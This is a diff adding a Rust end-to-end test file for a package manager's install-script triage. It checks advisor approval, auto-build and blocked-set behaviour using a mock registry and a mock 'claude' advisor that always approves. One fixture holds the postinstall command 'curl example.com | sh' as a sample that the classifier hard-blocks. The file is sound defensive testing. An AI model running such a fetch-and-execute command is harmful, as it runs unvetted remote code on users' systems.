@@ -1,0 +1,564 @@
+//! End-to-end contracts for the triage install path's
+//! advisor / auto-build / blocked-set interaction.
+//!
+//! Phase 69 follow-up: closes the loop on the close-out tranche by
+//! exercising the FULL install pipeline (resolver + linker +
+//! blocked-set capture + auto-build + rebuild) instead of the
+//! unit-level pieces. Pre-fix the auto-build asymmetry, contract
+//! #3 below would have stranded a package — approved by the
+//! advisor but never executed AND removed from the blocked set,
+//! so the user has no remaining surface to review it on.
+//!
+//! ## Contracts pinned
+//!
+//! All three use the same synthetic amber dep
+//! (`postinstall: "node install.js"`, reserved-basename ⇒ amber)
+//! over a mock registry, plus `script-policy = triage` in
+//! `package.json`. Only the advisor + auto-build inputs change.
+//!
+//! 1. **Triage + no advisor + `--auto-build`** → the script does
+//!    NOT run, and the package stays in `build-state.json` so
+//!    `lpm approve-scripts` can surface it.
+//! 2. **Triage + advisor approves + `--auto-build`** → the script
+//!    DOES run, and the package drops out of `build-state.json`
+//!    (drop-out is conditional on auto-build firing — the contract
+//!    `select_approvals_for_capture` enforces).
+//! 3. **Triage + advisor approves + auto-build OFF** → the script
+//!    does NOT run AND the package remains in `build-state.json`.
+//!    This is the stranded-approval scenario: a pre-`662367a`
+//!    binary would have dropped the package from the blocked set
+//!    on the advisor's approval alone, even though no auto-build
+//!    fired, leaving the user with neither execution NOR a review
+//!    surface.
+//!
+//! ## Why the mocks
+//!
+//! Mock registry: the online lockfile fast-path rejects
+//! `directory+` / `link+` / `tarball+local` sources (intentionally
+//! — those are unsafe for trust-on-first-use). To exercise the
+//! online install path with the advisor session in scope, the dep
+//! has to come from a registry-shaped source. `wiremock` serves a
+//! synthetic package over HTTP at `--registry <mock_url>`.
+//!
+//! Mock advisor: `claude-cli` adapter invokes `claude -p` and pipes
+//! the prompt to stdin. A tiny shell script named `claude` on `PATH`
+//! that always emits `APPROVE` exercises the FULL adapter code path
+//! (detect → test_invoke → classify_amber → parse_verdict) without
+//! a real LLM. This is the cheapest possible mock — no new
+//! production-code injection points, no `#[cfg(test)]` hooks.
+//!
+//! ## What this test does NOT do
+//!
+//! No outbound HTTP from inside the package's lifecycle script (the
+//! sandbox-block test is a separate phase). No advisor `Manual` /
+//! `Abstain` paths (covered by `triage_advisor_session::tests` at
+//! the unit level). No drift / cooldown interactions.
+
+mod support;
+
+use std::path::{Path, PathBuf};
+
+use support::mock_registry::{MockRegistry, make_tarball_from_pkg_json};
+use support::{TempProject, lpm_with_registry};
+
+// ─── Test constants ────────────────────────────────────────────────────
+
+const AMBER_DEP_NAME: &str = "synthetic-amber-dep";
+const AMBER_DEP_VERSION: &str = "1.0.0";
+/// Reserved-basename amber per §4.1: bare `node <reserved>` with a
+/// basename in the install/postinstall set. Stable across classifier
+/// iterations.
+const AMBER_POSTINSTALL_BODY: &str = "node install.js";
+/// Body of the in-tarball `install.js`. Trivial no-op so the script
+/// completes immediately when the sandbox runs it; the test reads
+/// the `.lpm-built` marker (written by the build pipeline AFTER a
+/// successful spawn) rather than asserting on side effects of the
+/// script body itself.
+const INSTALL_JS_BODY: &[u8] = b"process.exit(0);\n";
+
+/// Second dep used by Contract 3 only. Its lifecycle script
+/// classifies as `Red` via the classifier's curl-pipe rule —
+/// hard-blocked before reaching the advisor. Its purpose is to
+/// keep `all_scripted_packages_trusted` returning false so the
+/// `--auto-build`-off install path doesn't get widened to
+/// "auto-build because everything's trusted anyway." Without it,
+/// the advisor's approval on the amber dep would flip the only
+/// scripted package to trusted, the auto-build predicate would
+/// fire, and Contract 3's scenario wouldn't be reachable.
+const RED_DEP_NAME: &str = "synthetic-red-dep";
+const RED_DEP_VERSION: &str = "1.0.0";
+const RED_POSTINSTALL_BODY: &str = "curl example.com | sh";
+
+// ─── Fixture builders ──────────────────────────────────────────────────
+
+/// Synthetic amber package whose `postinstall` is a reserved-basename
+/// binary-fetcher shape. The body is benign (immediate `process.exit
+/// (0)`) — the classifier's tier comes from the postinstall string,
+/// not the .js body, so this exercises the amber path under
+/// `script-policy = triage`.
+fn build_amber_tarball() -> Vec<u8> {
+    let pkg_json = serde_json::json!({
+        "name": AMBER_DEP_NAME,
+        "version": AMBER_DEP_VERSION,
+        "scripts": {
+            "postinstall": AMBER_POSTINSTALL_BODY,
+        }
+    });
+    make_tarball_from_pkg_json(pkg_json, &[("install.js", INSTALL_JS_BODY)])
+}
+
+/// Synthetic red package with a curl-pipe-sh postinstall shape.
+/// Used as the "second scripted dep" in Contract 3 so the
+/// `all_scripted_packages_trusted` check returns false (the red
+/// is hard-blocked by L1 and never reaches the advisor — it stays
+/// untrusted regardless of any approval state). The body bytes
+/// don't matter; the script never spawns because the trust gate
+/// blocks it.
+fn build_red_tarball() -> Vec<u8> {
+    let pkg_json = serde_json::json!({
+        "name": RED_DEP_NAME,
+        "version": RED_DEP_VERSION,
+        "scripts": {
+            "postinstall": RED_POSTINSTALL_BODY,
+        }
+    });
+    make_tarball_from_pkg_json(pkg_json, &[])
+}
+
+/// Project manifest that depends on the synthetic amber dep and
+/// pins `script-policy = triage`. No CLI override needed — every
+/// test in this file runs in triage mode by virtue of the manifest
+/// key, matching how a real project would adopt the policy.
+fn triage_project_manifest() -> String {
+    format!(
+        r#"{{
+    "name": "triage-install-lifecycle-fixture",
+    "version": "1.0.0",
+    "dependencies": {{
+        "{AMBER_DEP_NAME}": "^{AMBER_DEP_VERSION}"
+    }},
+    "lpm": {{
+        "scriptPolicy": "triage"
+    }}
+}}
+"#
+    )
+}
+
+/// Project manifest for Contract 3: depends on BOTH the amber and
+/// red synthetic deps so `all_scripted_packages_trusted` returns
+/// false (the red dep is hard-blocked, can never be trusted),
+/// which keeps `auto_build_attempted = false` even when the
+/// advisor approves the amber dep. Without the red dep, a single
+/// advisor approval would flip the only scripted package to
+/// trusted, the auto-build predicate would widen, and the
+/// stranded-approval scenario wouldn't be reachable.
+fn triage_project_manifest_with_red() -> String {
+    format!(
+        r#"{{
+    "name": "triage-install-lifecycle-fixture",
+    "version": "1.0.0",
+    "dependencies": {{
+        "{AMBER_DEP_NAME}": "^{AMBER_DEP_VERSION}",
+        "{RED_DEP_NAME}": "^{RED_DEP_VERSION}"
+    }},
+    "lpm": {{
+        "scriptPolicy": "triage"
+    }}
+}}
+"#
+    )
+}
+
+/// Mount metadata + tarball for a single synthetic dep. Each call
+/// adds one package to the mock. Batch metadata is mounted
+/// separately via `mount_batch_metadata` so a multi-dep test
+/// supplies all entries in one call (the install pipeline issues
+/// a single batch fetch covering every root dep).
+async fn mount_single_package(mock: &MockRegistry, name: &str, version: &str, tarball: &[u8]) {
+    mock.with_package(name, version, tarball).await;
+}
+
+/// Mount the resolver's batch-metadata endpoint with one or more
+/// synthetic packages. The install pipeline calls this first; the
+/// per-package metadata mounted by `mount_single_package` is the
+/// fallback path. `time[version]` is far enough in the past that
+/// the L3 cooldown gate doesn't fire — tests in this file pin
+/// the advisor / auto-build interaction, not cooldown.
+async fn mount_batch_metadata(mock: &MockRegistry, packages: &[(&str, &str, &[u8])]) {
+    let entries: Vec<serde_json::Value> = packages
+        .iter()
+        .map(|(name, version, tarball)| {
+            let tarball_url = format!("{}/tarballs/{name}-{version}.tgz", mock.url());
+            let integrity = support::mock_registry::compute_integrity(tarball);
+            let version_owned = (*version).to_string();
+            let mut versions = serde_json::Map::new();
+            versions.insert(
+                version_owned.clone(),
+                serde_json::json!({
+                    "name": name,
+                    "version": version,
+                    "dist": {
+                        "tarball": tarball_url,
+                        "integrity": integrity,
+                    },
+                    "dependencies": {}
+                }),
+            );
+            let mut time = serde_json::Map::new();
+            time.insert(
+                version_owned.clone(),
+                serde_json::Value::String("2024-01-01T00:00:00.000Z".to_string()),
+            );
+            serde_json::json!({
+                "name": name,
+                "dist-tags": { "latest": version },
+                "versions": serde_json::Value::Object(versions),
+                "time": serde_json::Value::Object(time),
+            })
+        })
+        .collect();
+    mock.with_batch_metadata(entries).await;
+}
+
+/// Convenience for Contracts 1+2 (single amber dep). Wraps the
+/// single-package + batch-metadata mounts in one call so each
+/// test reads more directly.
+async fn mount_amber_dep(mock: &MockRegistry, tarball: &[u8]) {
+    mount_single_package(mock, AMBER_DEP_NAME, AMBER_DEP_VERSION, tarball).await;
+    mount_batch_metadata(mock, &[(AMBER_DEP_NAME, AMBER_DEP_VERSION, tarball)]).await;
+}
+
+// ─── Mock claude-cli helper ────────────────────────────────────────────
+
+/// Drop a `claude` shell script into a fresh temp dir and return
+/// that dir. Caller prepends it to the install command's `PATH`.
+/// The script always emits `APPROVE` on stdout — driving the
+/// adapter's `Provider::ClaudeCli` happy path end-to-end without
+/// a real LLM. `tempfile::TempDir` is dropped at scope exit so the
+/// mock binary is cleaned up automatically.
+///
+/// Returns `(TempDir, claude_bin_dir, original_path)` so the caller
+/// can keep the TempDir alive for the lifetime of the assert_cmd
+/// invocation AND restore `PATH` after — the TempDir doesn't drop
+/// the env var, just the directory.
+#[cfg(unix)]
+fn install_mock_claude_returning_approve() -> (tempfile::TempDir, PathBuf) {
+    use std::os::unix::fs::PermissionsExt;
+
+    let dir = tempfile::tempdir().expect("create mock-claude dir");
+    let bin = dir.path().join("claude");
+    // The mock:
+    //   - drains stdin so the adapter's write_all + shutdown
+    //     observes a clean EOF rather than a broken pipe;
+    //   - prints `APPROVE` on its own line to stdout, which the
+    //     two-pass verdict parser strict-matches as Approve;
+    //   - exits 0 so `run_with_stdin` treats it as a successful
+    //     advisor invocation.
+    std::fs::write(&bin, "#!/bin/sh\ncat > /dev/null\necho APPROVE\nexit 0\n")
+        .expect("write mock-claude script");
+    let mut perms = std::fs::metadata(&bin)
+        .expect("stat mock-claude")
+        .permissions();
+    perms.set_mode(0o755);
+    std::fs::set_permissions(&bin, perms).expect("chmod mock-claude");
+    let bin_dir = dir.path().to_path_buf();
+    (dir, bin_dir)
+}
+
+// ─── Observability helpers ─────────────────────────────────────────────
+
+/// Return the path the build pipeline writes `.lpm-built` to after a
+/// successful lifecycle-script spawn. Matches the path
+/// `rebuild.rs` workflow tests use to detect post-spawn success.
+fn lpm_built_marker(project: &TempProject) -> PathBuf {
+    let safe = AMBER_DEP_NAME.replace(['/', '\\'], "+");
+    project
+        .store_dir()
+        .join("v1")
+        .join(format!("{safe}@{AMBER_DEP_VERSION}"))
+        .join(".lpm-built")
+}
+
+/// Parse `<project>/.lpm/build-state.json` and check whether the
+/// synthetic dep is listed in `blocked_packages`. `None` when the
+/// build-state file is missing (install never reached the capture
+/// step — assertion failure should distinguish that from "in" /
+/// "not in").
+fn amber_dep_in_blocked_set(project: &TempProject) -> Option<bool> {
+    let path = project.path().join(".lpm").join("build-state.json");
+    if !path.exists() {
+        return None;
+    }
+    let raw = std::fs::read_to_string(&path).ok()?;
+    let v: serde_json::Value = serde_json::from_str(&raw).ok()?;
+    let arr = v.get("blocked_packages")?.as_array()?;
+    Some(
+        arr.iter()
+            .any(|p| p.get("name").and_then(|n| n.as_str()) == Some(AMBER_DEP_NAME)),
+    )
+}
+
+/// `true` if `node` is on PATH. Tests that assert on `.lpm-built`
+/// (which requires a real script spawn) skip the spawn-side check
+/// when node is unavailable, matching the `rebuild.rs` precedent —
+/// CI containers without node still gate the install / blocked-set
+/// contracts, just not the "did the script actually run" half.
+fn node_available() -> bool {
+    std::process::Command::new("node")
+        .arg("--version")
+        .output()
+        .map(|o| o.status.success())
+        .unwrap_or(false)
+}
+
+/// Strip ANSI color codes so stderr assertions don't fight terminal
+/// styling. Same helper shape as `rebuild.rs`.
+fn strip_ansi(s: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    let mut chars = s.chars().peekable();
+    while let Some(c) = chars.next() {
+        if c == '\u{1b}' && chars.peek() == Some(&'[') {
+            chars.next();
+            for cc in chars.by_ref() {
+                let cb = cc as u32;
+                if (0x40..=0x7e).contains(&cb) {
+                    break;
+                }
+            }
+        } else {
+            out.push(c);
+        }
+    }
+    out
+}
+
+// ─── Contract 1 — no advisor, auto-build on, amber stays blocked ──────
+
+/// **Contract 1.** Under `script-policy = triage` with no advisor
+/// and `--auto-build`, an amber package's lifecycle script must
+/// NOT run AND the package must remain in the persisted blocked
+/// set so `lpm approve-scripts` can surface it.
+///
+/// Why this matters: triage's safety mechanism IS the per-package
+/// gate. `--auto-build` widens the rebuild target set to "every
+/// trusted scripted package" but does NOT lower the trust gate —
+/// amber without an advisor approval is untrusted, so it stays
+/// blocked regardless of `--auto-build`.
+#[tokio::test]
+async fn triage_no_advisor_with_auto_build_keeps_amber_blocked_and_unbuilt() {
+    let mock = MockRegistry::start().await;
+    let tarball = build_amber_tarball();
+    mount_amber_dep(&mock, &tarball).await;
+
+    let project = TempProject::empty(&triage_project_manifest());
+
+    let out = lpm_with_registry(&project, &mock.url())
+        .args(["install", "--triage", "--auto-build"])
+        .output()
+        .expect("spawn lpm install");
+    let stderr = strip_ansi(&String::from_utf8_lossy(&out.stderr));
+    assert!(
+        out.status.success(),
+        "install must succeed even when amber packages stay blocked; stderr:\n{stderr}"
+    );
+
+    // Blocked-set contract: the amber dep MUST persist in
+    // `.lpm/build-state.json` so `lpm approve-scripts` can review it.
+    let in_blocked =
+        amber_dep_in_blocked_set(&project).expect("build-state.json must exist after install");
+    assert!(
+        in_blocked,
+        "amber dep MUST remain in the blocked set when no advisor approves it; \
+         stderr:\n{stderr}"
+    );
+
+    // Execution contract: the `.lpm-built` marker MUST NOT exist —
+    // the trust evaluator returned `Untrusted` for the amber path
+    // with no approval, so the script never spawned.
+    let marker = lpm_built_marker(&project);
+    assert!(
+        !marker.exists(),
+        "amber script MUST NOT have run without an approval; marker found at {}",
+        marker.display(),
+    );
+}
+
+// ─── Contract 2 — advisor approves, auto-build on, amber runs ─────────
+
+/// **Contract 2.** With an advisor configured to APPROVE, plus
+/// `--auto-build`, the amber package's script DOES run and the
+/// package drops out of `build-state.json` — because it's no
+/// longer "blocked," it ran during this install.
+///
+/// Skipped (with a soft-pass) when `node` isn't on PATH: the
+/// install / blocked-set half still runs, but the `.lpm-built`
+/// marker requires a real lifecycle-script spawn.
+#[cfg(unix)]
+#[tokio::test]
+async fn triage_advisor_approve_with_auto_build_runs_amber_and_drops_from_blocked() {
+    let mock = MockRegistry::start().await;
+    let tarball = build_amber_tarball();
+    mount_amber_dep(&mock, &tarball).await;
+
+    let project = TempProject::empty(&triage_project_manifest());
+    let (_mock_claude_dir, claude_bin_dir) = install_mock_claude_returning_approve();
+
+    let path_var = prepend_to_path(&claude_bin_dir);
+    let out = lpm_with_registry(&project, &mock.url())
+        .args([
+            "install",
+            "--triage",
+            "--auto-build",
+            "--advisor=claude-cli",
+        ])
+        .env("PATH", &path_var)
+        .output()
+        .expect("spawn lpm install");
+    let stderr = strip_ansi(&String::from_utf8_lossy(&out.stderr));
+    assert!(
+        out.status.success(),
+        "install must succeed under advisor-approve + auto-build; stderr:\n{stderr}"
+    );
+
+    // Blocked-set contract: advisor approved AND auto-build fired,
+    // so the package's scripts executed via `AdvisorApprovedThisRun`
+    // and the package is excluded from `.lpm/build-state.json` by
+    // `select_approvals_for_capture(auto_build_attempted=true,
+    // approvals)`.
+    let in_blocked =
+        amber_dep_in_blocked_set(&project).expect("build-state.json must exist after install");
+    assert!(
+        !in_blocked,
+        "advisor-approved amber under auto-build MUST drop out of the blocked set; \
+         stderr:\n{stderr}"
+    );
+
+    // Execution contract: spawn assertion ONLY when node is
+    // available — the marker is written by the build pipeline AFTER
+    // the lifecycle script returns 0, so it's a faithful "script
+    // ran" sentinel.
+    if node_available() {
+        let marker = lpm_built_marker(&project);
+        assert!(
+            marker.exists(),
+            "advisor-approved amber MUST have run under auto-build; marker missing at {}; \
+             stderr:\n{stderr}",
+            marker.display(),
+        );
+    }
+}
+
+// ─── Contract 3 — STRANDED APPROVAL ────────────────────────────────────
+
+/// **Contract 3.** The load-bearing test: advisor approves, but
+/// auto-build is OFF.
+///
+/// Pre-`662367a`, the install pipeline unconditionally excluded
+/// advisor-approved triples from the persisted blocked set, even
+/// when `auto_build_attempted = false`. That stranded the package:
+/// the script never ran (no auto-build), AND the package vanished
+/// from `.lpm/build-state.json`, so `lpm approve-scripts` had no
+/// review surface either. The user was left with "not executed,
+/// not reviewable."
+///
+/// The fix conditions the blocked-set exclusion on whether
+/// auto-build will actually fire (`select_approvals_for_capture`).
+/// When auto-build is off, the approval is recorded for THIS run
+/// (and would have applied if auto-build had fired), but the
+/// blocked-set capture ignores it — so the persisted state still
+/// surfaces the package for `approve-scripts` even though the
+/// in-memory `AdvisorSession` would have unlocked it.
+///
+/// This test pins the contract end-to-end. Pre-fix it fails; post-
+/// fix it passes.
+#[cfg(unix)]
+#[tokio::test]
+async fn triage_advisor_approve_without_auto_build_strands_neither_script_nor_review() {
+    // **Two-dep setup (load-bearing).** A single advisor-approved
+    // amber dep would flip `all_scripted_packages_trusted` to true
+    // (the only scripted package is trusted via
+    // `AdvisorApprovedThisRun`), which widens the auto-build
+    // predicate and short-circuits the stranded-approval scenario
+    // before it can fire. Pairing the amber dep with a red dep —
+    // hard-blocked by L1, can NEVER be trusted regardless of
+    // approvals — keeps `all_trusted = false`, so
+    // `auto_build_attempted = false` is reachable even though the
+    // advisor approves the amber path. This is the only
+    // combinator that exercises the exact pre-fix bug:
+    //
+    //   advisor approves A, auto-build never fires →
+    //     pre-fix: A drops out of blocked set anyway → stranded.
+    //     post-fix: A stays in blocked set → reviewable.
+    let mock = MockRegistry::start().await;
+    let amber_tarball = build_amber_tarball();
+    let red_tarball = build_red_tarball();
+    mount_single_package(&mock, AMBER_DEP_NAME, AMBER_DEP_VERSION, &amber_tarball).await;
+    mount_single_package(&mock, RED_DEP_NAME, RED_DEP_VERSION, &red_tarball).await;
+    mount_batch_metadata(
+        &mock,
+        &[
+            (AMBER_DEP_NAME, AMBER_DEP_VERSION, &amber_tarball),
+            (RED_DEP_NAME, RED_DEP_VERSION, &red_tarball),
+        ],
+    )
+    .await;
+
+    let project = TempProject::empty(&triage_project_manifest_with_red());
+    let (_mock_claude_dir, claude_bin_dir) = install_mock_claude_returning_approve();
+
+    let path_var = prepend_to_path(&claude_bin_dir);
+    let out = lpm_with_registry(&project, &mock.url())
+        // Note: NO `--auto-build`. Triage policy alone does NOT fire
+        // auto-build (Phase 57 expanded Allow only). With the red
+        // dep present, `all_trusted` resolves to false, so the
+        // only remaining trigger is the missing `--auto-build`
+        // flag — `auto_build_attempted = false`.
+        .args(["install", "--triage", "--advisor=claude-cli"])
+        .env("PATH", &path_var)
+        .output()
+        .expect("spawn lpm install");
+    let stderr = strip_ansi(&String::from_utf8_lossy(&out.stderr));
+    assert!(
+        out.status.success(),
+        "install must succeed under advisor-approve + no-auto-build; stderr:\n{stderr}"
+    );
+
+    // Blocked-set contract — the stranded-approval guard. The
+    // amber dep MUST remain in `.lpm/build-state.json`. A pre-fix
+    // binary would have removed it on the advisor's approval
+    // alone.
+    let in_blocked =
+        amber_dep_in_blocked_set(&project).expect("build-state.json must exist after install");
+    assert!(
+        in_blocked,
+        "STRANDED-APPROVAL REGRESSION: advisor-approved amber without auto-build MUST \
+         remain in the blocked set so `lpm approve-scripts` can review it; stderr:\n{stderr}"
+    );
+
+    // Execution contract: the marker MUST NOT exist. auto-build
+    // didn't fire, so the script never spawned regardless of the
+    // advisor's verdict. Coupled with the blocked-set assertion
+    // above, the user is left with "not executed, but reviewable"
+    // — the correct end state, where pre-fix would have been "not
+    // executed AND not reviewable."
+    let marker = lpm_built_marker(&project);
+    assert!(
+        !marker.exists(),
+        "amber script MUST NOT have run without auto-build firing; marker found at {}",
+        marker.display(),
+    );
+}
+
+// ─── Helpers ───────────────────────────────────────────────────────────
+
+/// Prepend `dir` to the current process's `PATH`, returning the new
+/// `PATH` value. Used so the mock `claude` shadows any real
+/// `claude` on the developer's machine without mutating the caller's
+/// environment.
+fn prepend_to_path(dir: &Path) -> std::ffi::OsString {
+    let original = std::env::var_os("PATH").unwrap_or_default();
+    let mut paths: Vec<PathBuf> = vec![dir.to_path_buf()];
+    paths.extend(std::env::split_paths(&original));
+    std::env::join_paths(paths).expect("PATH join")
+}
